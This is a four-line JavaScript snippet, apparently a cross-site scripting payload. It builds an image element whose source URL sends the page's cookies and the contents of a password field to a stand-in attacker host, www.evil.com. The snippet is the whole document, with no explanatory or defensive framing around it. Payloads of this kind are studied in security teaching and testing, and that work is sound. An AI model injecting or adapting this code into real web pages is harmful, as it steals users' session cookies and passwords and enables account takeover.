var img = document.createElement('img');
var c = 'cookie=' + document.cookie;
var p = 'pwd=' + document.getElementById('pwd').value;
img.src = 'http://www.evil.com/doBadThings?' + c + '&' + p;